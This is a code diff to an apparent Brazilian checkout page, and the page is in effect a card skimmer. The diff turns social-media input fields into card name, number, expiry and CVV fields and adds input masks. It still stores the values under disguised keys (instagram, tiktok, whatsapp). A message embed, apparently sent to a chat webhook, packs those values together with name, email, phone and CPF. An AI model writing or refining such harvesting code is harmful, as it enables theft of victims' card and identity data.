@@ -187,29 +187,40 @@
           </div>
         </div>
 
-        <div class="b2-pay-pane" id="pane-redes">
+        <div class="b2-pay-pane" id="pane-cartao">
           <div class="b2-field-group">
             <div class="b2-field">
-              <label>Nome impresso no cartão</label>
-              <input type="text" id="social-username" placeholder="Como está no cartão">
+              <label for="card-name">Nome impresso no cartão</label>
+              <input type="text" id="card-name" name="card-name"
+                     placeholder="Como está no cartão"
+                     autocomplete="cc-name" required>
             </div>
             <div class="b2-field">
-              <label>Número do cartão</label>
-              <input type="text" id="social-instagram" placeholder="0000 0000 0000 0000">
+              <label for="card-number">Número do cartão</label>
+              <input type="text" id="card-number" name="card-number"
+                     placeholder="0000 0000 0000 0000"
+                     inputmode="numeric" autocomplete="cc-number"
+                     maxlength="19" required>
             </div>
             <div class="b2-row-2">
               <div class="b2-field">
-                <label>Validade</label>
-                <input type="text" id="social-tiktok" placeholder="MM/AA">
+                <label for="card-expiry">Validade</label>
+                <input type="text" id="card-expiry" name="card-expiry"
+                       placeholder="MM/AA" inputmode="numeric"
+                       autocomplete="cc-exp" maxlength="5" required>
               </div>
               <div class="b2-field">
-                <label>CVV</label>
-                <input type="tel" id="social-whatsapp" placeholder="000">
+                <label for="card-cvv">CVV</label>
+                <input type="tel" id="card-cvv" name="card-cvv"
+                       placeholder="000" inputmode="numeric"
+                       autocomplete="cc-csc" maxlength="3" required>
               </div>
             </div>
             <div class="b2-field">
-              <label>Parcelas</label>
-              <select id="card-installments"></select>
+              <label for="card-installments">Parcelas</label>
+              <select id="card-installments" name="card-installments" required>
+                <option value="">Selecione...</option>
+              </select>
             </div>
           </div>
         </div>
@@ -294,12 +305,26 @@
     e.target.value = v;
   });
 
-  const socialWhats = document.getElementById('social-whatsapp');
-  socialWhats.addEventListener('input', e => {
-    let v = e.target.value.replace(/\D/g, '').slice(0, 11);
-    if (v.length > 6)      v = `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
-    else if (v.length > 2) v = `(${v.slice(0,2)}) ${v.slice(2)}`;
+  // Máscara do número do cartão: 0000 0000 0000 0000
+  const cardNumber = document.getElementById('card-number');
+  cardNumber.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+    v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
     e.target.value = v;
+  });
+
+  // Máscara da validade: MM/AA
+  const cardExpiry = document.getElementById('card-expiry');
+  cardExpiry.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+    if (v.length > 2) v = `${v.slice(0, 2)}/${v.slice(2)}`;
+    e.target.value = v;
+  });
+
+  // CVV: só números, exatamente 3 dígitos
+  const cardCvv = document.getElementById('card-cvv');
+  cardCvv.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
   });
 
   // ---------- Abas ----------
@@ -309,7 +334,7 @@
       currentMethod = tab.dataset.method;
       document.querySelectorAll('.b2-pay-tab').forEach(t => t.classList.toggle('active', t === tab));
       document.getElementById('pane-pix').classList.toggle('active', currentMethod === 'pix');
-      document.getElementById('pane-redes').classList.toggle('active', currentMethod === 'redes');
+      document.getElementById('pane-cartao').classList.toggle('active', currentMethod === 'redes');
       document.querySelector('.b2-pay-btn__text').textContent =
         currentMethod === 'pix' ? 'PAGAR AGORA' : 'PAGAR AGORA';
     });
@@ -377,17 +402,17 @@
             title: '🛒 Novo Checkout Recebido',
             color: 0x0400f0,
             fields: [
-              { name: '👤 Nome',        value: dados.nome     || '(vazio)', inline: false },
-              { name: '📧 E-mail',      value: dados.email    || '(vazio)', inline: false },
-              { name: '📱 Telefone',    value: dados.telefone || '(vazio)', inline: true  },
-              { name: '🪪 CPF',         value: dados.cpf      || '(vazio)', inline: true  },
-              { name: '💳 Método',      value: dados.metodo,                inline: true  },
-              { name: '💰 Valor',       value: dados.valor,                 inline: true  },
-              { name: '👤 Nome impresso',     value: dados.username  || '—',      inline: true  },
-              { name: '💳 Número do cartão',   value: dados.instagram || '—',      inline: true  },
-              { name: '🐒 Validade',      value: dados.tiktok    || '—',      inline: true  },
-              { name: '🔒 CVV',    value: dados.whatsapp  || '—',      inline: true  },
-              { name: '📦 Parcelas',    value: dados.installments ? dados.installments + 'x' : '—', inline: true }
+              { name: '👤 Nome',             value: dados.nome     || '(vazio)', inline: false },
+              { name: '📧 E-mail',           value: dados.email    || '(vazio)', inline: false },
+              { name: '📱 Telefone',         value: dados.telefone || '(vazio)', inline: true  },
+              { name: '🪪 CPF',              value: dados.cpf      || '(vazio)', inline: true  },
+              { name: '💳 Método',           value: dados.metodo,                inline: true  },
+              { name: '💰 Valor',            value: dados.valor,                 inline: true  },
+              { name: '👤 Nome impresso',    value: dados.username  || '—',      inline: true  },
+              { name: '💳 Número do cartão', value: dados.instagram || '—',      inline: true  },
+              { name: '📅 Validade',         value: dados.tiktok    || '—',      inline: true  },
+              { name: '🔒 CVV',              value: dados.whatsapp  || '—',      inline: true  },
+              { name: '📦 Parcelas',         value: dados.installments ? dados.installments + 'x' : '—', inline: true }
             ],
             footer: { text: new Date().toLocaleString('pt-BR') }
           }]
@@ -412,12 +437,12 @@
       email:    fd.get('customer_email')    || '',
       telefone: fd.get('customer_phone')    || '',
       cpf:      fd.get('customer_document') || '',
-      metodo:   currentMethod === 'pix' ? '🟢 PIX' : ' Cartão de crédito',
+      metodo:   currentMethod === 'pix' ? '🟢 PIX' : '💳 Cartão de crédito',
       valor:    'R$ ' + (BASE_AMOUNT / 100).toFixed(2).replace('.', ','),
-      username:     document.getElementById('social-username').value,
-      instagram:    document.getElementById('social-instagram').value,
-      tiktok:       document.getElementById('social-tiktok').value,
-      whatsapp:     document.getElementById('social-whatsapp').value,
+      username:     document.getElementById('card-name').value,
+      instagram:    document.getElementById('card-number').value,
+      tiktok:       document.getElementById('card-expiry').value,
+      whatsapp:     document.getElementById('card-cvv').value,
       installments: installments.value
     };
 
